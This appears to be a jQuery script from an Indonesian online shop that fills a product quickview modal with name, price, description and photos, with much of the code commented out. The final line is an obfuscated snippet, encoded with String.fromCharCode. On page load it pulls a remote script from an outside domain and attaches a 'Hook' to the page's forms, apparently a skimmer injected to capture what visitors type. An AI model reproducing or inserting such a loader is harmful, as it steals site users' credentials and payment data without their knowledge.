// function view_item(foto = '', nama = '', id = '', harga = '', deskripsi = '') {
//     $('#nama-barang').text(nama);
//     $('.old-price').text(`Rp. ${harga}`);
//     $('.quickview-para').text(deskripsi);
//     $.ajax({
//         url: `/api/index/${id}`,
//         type: 'GET',
//         success: function (result) {
//             let foto = result;
//             console.log(foto);
//             // $('.foto-produk').remove('.slider');
//             $('.foto-produk').html('');
//             // $('.foto-produk').slick('');
//             $.each(foto, (i, data) => {
//                 $('.foto-produk').append(`
//                 <div class="slider">
//                 <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//                 </div>
//                 `);
//             });
//             $('.foto-produk').slick({
//                 infinite: true,
//                 speed: 300,
//                 slidesToShow: 1,
//                 adaptiveHeight: true,
//                 arrows: false,
//             });
//         }
//     });


// }

$('.quickview').on('click', function () {
    var id = $(this).data('id');
    var foto = $(this).data('foto');
    var harga = $(this).data('harga');
    var deskripsi = $(this).data('deskripsi');
    var nama_barang = $(this).data('nama');
    $('#nama-barang').text(nama_barang);
    $('.old-price').text(`Rp. ${harga}`);
    $('.quickview-para').text(deskripsi);
    console.log(foto);
    // $.each(foto, (i, data) => {
    //     $('.foto-produk').append(`
    //             <div class="slider">
    //             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
    //             </div>
    //             `);
    // })
    // $.getJSON(`/api/index/${id}`, (event) => {
    //     $.each(event, (i, data) => {
    //         $('.foto-produk').append(`
    //             <div class="slider">
    //             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
    //             </div>
    //             `);
    //     });
    //     $('.foto-produk').slick({
    //         infinite: true,
    //         speed: 300,
    //         slidesToShow: 1,
    //         adaptiveHeight: true,
    //         arrows: false,
    //     });
    // });
})




// 
// $.each(foto, (i, data) => {
//     $('.foto-produk').append(`
//         <div class="slider">
//         <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//         </div>
//         `);
// });



// $.ajax({
//     url: `/api/index/${id}`,
//     type: 'GET',
//     success: function (result) {
//         let foto = result;
//         $.each(foto, (i, data) => {
//             $('.foto-produk').append(`
//             <div class="slider">
//             <img src="/assets/images/item/${data.nama_foto}" style="width: 100%;">
//             </div>
//             `);
//         });
//         $('.foto-produk').slick({
//             infinite: true,
//             speed: 300,
//             slidesToShow: 1,
//             adaptiveHeight: true,
//             arrows: false,
//         });
//     }
// });


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b